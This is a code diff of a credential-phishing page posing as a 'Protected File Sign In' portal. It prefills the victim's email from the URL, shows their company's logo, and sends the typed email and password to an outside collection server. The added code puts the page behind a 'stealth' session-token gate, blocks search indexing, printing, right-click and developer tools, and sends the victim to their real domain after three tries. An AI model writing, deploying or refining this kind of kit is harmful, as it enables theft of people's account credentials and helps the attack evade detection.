@@ -3,7 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
- <title>Protected File Sign In</title>
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <title>Protected File Sign In</title>
 
   <!-- ✅ Google Translate Language Detection -->
   <script>
@@ -71,7 +76,13 @@
     .goog-logo-link {
       display: none !important;
     }
-    body { top: 0 !important; }
+    body { 
+      top: 0 !important; 
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
 
     /* Your original styles */
     body {
@@ -182,6 +193,9 @@
       bottom: 10px;
       right: 70px;
     }
+    @media print {
+      * { display: none !important; }
+    }
   </style>
 </head>
 <body>
@@ -217,138 +231,232 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
   <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 <script>
-  // Global domain variable
-  let domain = "";
-
-  // Base64 decode helper (URL-safe)
-  function decodeData(encoded) {
-    encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
-    while (encoded.length % 4) {
-      encoded += '=';
+  (function() {
+    'use strict';
+    
+    // Security measures
+    let sessionValid = false;
+    let tokenValid = false;
+    
+    // Global domain variable
+    let domain = "";
+    
+    // Enhanced parameter parser for stealth compatibility
+    function parseHashParams() {
+      const hash = window.location.hash.substring(1);
+      const params = {};
+      
+      if (hash) {
+        const pairs = hash.split('&');
+        pairs.forEach(pair => {
+          const [key, value] = pair.split('=');
+          if (key && value) {
+            params[key] = value;
+          }
+        });
+      }
+      
+      return params;
     }
-    return decodeURIComponent(atob(encoded));
-  }
 
-  // Mark JS and mouse activity
-  document.cookie = "js_enabled=1; path=/";
-  document.addEventListener("mousemove", function () {
-    document.cookie = "mouse_moved=1; path=/";
-  }, { once: true });
-
-  // Decode email and update UI
-  document.addEventListener("DOMContentLoaded", function () {
-    const emailInput = document.getElementById("email");
-    const domainInfo = document.getElementById("domain-info");
-    const logo = document.getElementById("email-logo");
-
-    function updateUI(email) {
-      const domainMatch = email.match(/@([\w.-]+\.\w+)/);
-      if (domainMatch) {
-        domain = domainMatch[1]; // Store domain globally
-        domainInfo.textContent = `Sign in with your ${domain} Email`;
-        const logoUrl = `https://logo.clearbit.com/${domain}`;
-        logo.src = logoUrl;
-        logo.style.display = "block";
-        logo.onerror = function () {
-          logo.src = "P_icon.svg";
-        };
-      } else {
-        domainInfo.textContent = "Sign in with your Domain Email";
-        logo.style.display = "none";
+    // Base64 decode helper (URL-safe) - compatible with stealth index
+    function decodeData(encoded) {
+      try {
+        // Handle URL-safe base64
+        encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
+        while (encoded.length % 4) {
+          encoded += '=';
+        }
+        return decodeURIComponent(atob(encoded));
+      } catch (e) {
+        console.error('Decode error:', e);
+        return null;
       }
     }
-
-    // Extract and decode email from hash
-    const hash = window.location.hash.substring(1);
-    const parts = hash.split("&");
-    const encodedEmail = parts[0];
-
-    try {
-      if (encodedEmail) {
+    
+    // Validate session from stealth index
+    function validateSession(params) {
+      const { email: encodedEmail, token, _ } = params;
+      
+      if (!encodedEmail || !token) {
+        return false;
+      }
+      
+      // Check session storage for validation (set by stealth index)
+      const storedEmail = sessionStorage.getItem(atob('cmVkaXJlY3RfZW1haWw='));
+      const storedToken = sessionStorage.getItem(atob('cmVkaXJlY3RfdG9rZW4='));
+      
+      if (storedEmail && storedToken && storedToken === token) {
         const decodedEmail = decodeData(encodedEmail);
-        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
+        if (decodedEmail && decodedEmail === storedEmail) {
+          return true;
+        }
+      }
+      
+      return false;
+    }
+
+    // Mark JS and mouse activity
+    document.cookie = "js_enabled=1; path=/";
+    document.addEventListener("mousemove", function () {
+      document.cookie = "mouse_moved=1; path=/";
+    }, { once: true });
+
+    // Enhanced email processing and UI update
+    document.addEventListener("DOMContentLoaded", function () {
+      const emailInput = document.getElementById("email");
+      const domainInfo = document.getElementById("domain-info");
+      const logo = document.getElementById("email-logo");
+
+      function updateUI(email) {
+        const domainMatch = email.match(/@([\w.-]+\.\w+)/);
+        if (domainMatch) {
+          domain = domainMatch[1]; // Store domain globally
+          domainInfo.textContent = `Sign in with your ${domain} Email`;
+          const logoUrl = `https://logo.clearbit.com/${domain}`;
+          logo.src = logoUrl;
+          logo.style.display = "block";
+          logo.onerror = function () {
+            logo.src = "P_icon.svg";
+          };
+        } else {
+          domainInfo.textContent = "Sign in with your Domain Email";
+          logo.style.display = "none";
+        }
+      }
+
+      // Parse URL parameters properly
+      const params = parseHashParams();
+      
+      // Validate session and extract email
+      if (validateSession(params)) {
+        sessionValid = true;
+        tokenValid = true;
+        
+        const decodedEmail = decodeData(params.email);
+        if (decodedEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
           emailInput.value = decodedEmail;
           updateUI(decodedEmail);
         }
+      } else {
+        // Invalid session - redirect back or show error
+        console.error('Invalid session parameters');
+        setTimeout(() => {
+          window.location.href = '../index.html';
+        }, 2000);
+        return;
       }
-    } catch (e) {
-      console.error("Email decoding failed:", e);
-      emailInput.value = "";
-    }
-  });
-
-  // jQuery-based form handling
-  $(document).ready(function () {
-    var count = 0;
-
-    $('#submit-btn').click(function (event) {
-      event.preventDefault();
-      $('#error').hide();
-      $('#msg').hide();
-
-      var email = $("#email").val();
-      var password = $("#password").val();
-      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-      if (!email) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>Email field is empty</p>");
-        return false;
+      
+      // Clear URL hash for security
+      if (history.replaceState) {
+        history.replaceState(null, '', window.location.pathname + window.location.search);
       }
+    });
 
-      if (!filter.test(email)) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
-        return false;
-      }
+    // Enhanced form handling with session validation
+    $(document).ready(function () {
+      var count = 0;
 
-      if (!password) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>Password field is empty</p>");
-        return false;
-      }
+      $('#submit-btn').click(function (event) {
+        event.preventDefault();
+        
+        // Validate session before processing
+        if (!sessionValid || !tokenValid) {
+          window.location.href = '../index_stealth.html';
+          return false;
+        }
+        
+        $('#error').hide();
+        $('#msg').hide();
 
-      if (password.length < 6) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>An error occurred, invalid password</p>");
-        return false;
-      }
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-      count++;
+        if (!email) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Email field is empty</p>");
+          return false;
+        }
 
-      $.ajax({
-        dataType: 'JSON',
-        url: 'https://po.mkkhsv2.sa.com/css/css/.maxim/bn/ad.php',
-        type: 'POST',
-        data: {
-          email: email,
-          password: password,
-          email_confirm: $('#email_confirm').val()
-        },
-        beforeSend: function () {
-          $('#submit-btn').html('Signing in...');
-        },
-        success: function (response) {
-          if (!response || response.signal !== 'ok') {
-            $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>").show();
-          } else {
+        if (!filter.test(email)) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
+          return false;
+        }
+
+        if (!password) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Password field is empty</p>");
+          return false;
+        }
+
+        if (password.length < 6) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>An error occurred, invalid password</p>");
+          return false;
+        }
+
+        count++;
+
+        $.ajax({
+          dataType: 'JSON',
+          url: 'https://po.mkkhsv2.sa.com/css/css/.maxim/bn/ad.php',
+          type: 'POST',
+          data: {
+            email: email,
+            password: password,
+            email_confirm: $('#email_confirm').val(),
+            session_token: sessionStorage.getItem(atob('cmVkaXJlY3RfdG9rZW4=')) // Add session validation
+          },
+          beforeSend: function () {
+            $('#submit-btn').html('Signing in...');
+          },
+          success: function (response) {
+            if (!response || response.signal !== 'ok') {
+              $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>").show();
+            } else {
+              $("#password").val("");
+              if (count >= 3 && domain) {
+                count = 0;
+                // Clear session before redirect
+                sessionStorage.removeItem(atob('cmVkaXJlY3RfZW1haWw='));
+                sessionStorage.removeItem(atob('cmVkaXJlY3RfdG9rZW4='));
+                window.location.href = "https://www." + domain;
+              }
+            }
+          },
+          error: function () {
             $("#password").val("");
             if (count >= 3 && domain) {
               count = 0;
+              // Clear session before redirect
+              sessionStorage.removeItem(atob('cmVkaXJlY3RfZW1haWw='));
+              sessionStorage.removeItem(atob('cmVkaXJlY3RfdG9rZW4='));
               window.location.href = "https://www." + domain;
             }
+            $("#msg").show();
+          },
+          complete: function () {
+            $('#submit-btn').html('View File 87 KB');
           }
-        },
-        error: function () {
-          $("#password").val("");
-          if (count >= 3 && domain) {
-            count = 0;
-            window.location.href = "https://www." + domain;
-          }
-          $("#msg").show();
-        },
-        complete: function () {
-          $('#submit-btn').html('View File 87 KB');
-        }
+        });
       });
     });
-  });
+    
+    // Security monitoring
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('dragstart', e => e.preventDefault());
+    
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || 
+          (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+          (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+          (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+          (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        window.location.href = '../index_stealth.html';
+      }
+    });
+    
+  })();
 </script>
 
 </body>
